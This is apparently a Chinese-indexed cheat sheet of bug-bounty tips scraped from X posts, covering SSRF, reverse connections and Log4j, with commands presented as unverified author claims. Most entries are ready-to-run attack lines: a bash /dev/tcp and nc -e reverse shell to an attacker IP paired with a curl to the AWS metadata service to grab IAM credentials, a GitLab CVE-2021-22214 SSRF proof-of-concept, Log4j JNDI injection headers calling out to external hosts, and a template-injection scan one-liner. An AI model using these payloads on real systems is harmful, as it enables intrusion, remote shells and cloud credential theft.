# X 语料 · 残余回收（SSRF / 反连）

来源：X 公开贴子，含可直接套用的骨架（命令行 / 载荷 / 请求头 / 绕过变体）。仅纯文本，图片与外部媒体已剥离。
作者自述内容，未经复现验证。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[SSRF](../by-type/ssrf.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-ssrf-1（54 条）、x-exp-ssrf（63 条） · 本文 34 行

- waybackurls http://bounty.com | grep '=' | qsreplace "kingofbounty{{9*9}}" | httpx -match-regex 'kingofbounty81' -threads 300 -http-proxy http://127.0.0.1:8080/
- When you have RCE on AWS Linux server open reverse shell and get AWS IAM creds
  You:
  nc -lvp port
  Server:
  bash -i >& /dev/tcp/yourIP/port 0>&1
  or
  nc yourIP port -e /bin/bash
  run command in the reverse shell:
  curl http://169.254.169.254/metadata/latest/
- GitLab CE/EE >=10.5 SSRF (CVE-2021-22214)
  POC:
  curl -s --show-error -H 'Content-Type: application/json' --data '{ "include_merged_yaml": true, "content": "include:\n remote: http://x.x.x.x/api/v1/targets?test.yml"}' https://REDACTED/api/v4/ci/lint -k
- You can send remote VPS requests to your local BURP using SSH.
  Run this in your computer connecting to your VPS
  ssh -R 8080:127.0.0.1:8080 root@VPS_IP -f -N
  And in your VPS you can run anything like
  curl URL -x http://127.0.0.1:8080
- Identify Vulnerable Remote Servers:
  curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://x${hostName}.L4J.<RANDOM_STRING>.canarytokens.com/a}'
- Log4j Application was running java
  Vulnerable header :
  X-Forwarded-For: ${jndi:ldap://${:-874}${:-705}.${hostName}.xforwardedfor.<Server-link>}
- Nuclei Template : REFLECTION
  Potential XSS, SSRF, Cache Poisoning and Open URL Redirection, OAUTH Redirection
  nuclei -t reflection[.]yaml -u target
  https://github.com/schooldropout1337/nuclei-templates/blob/main/reflection.yaml
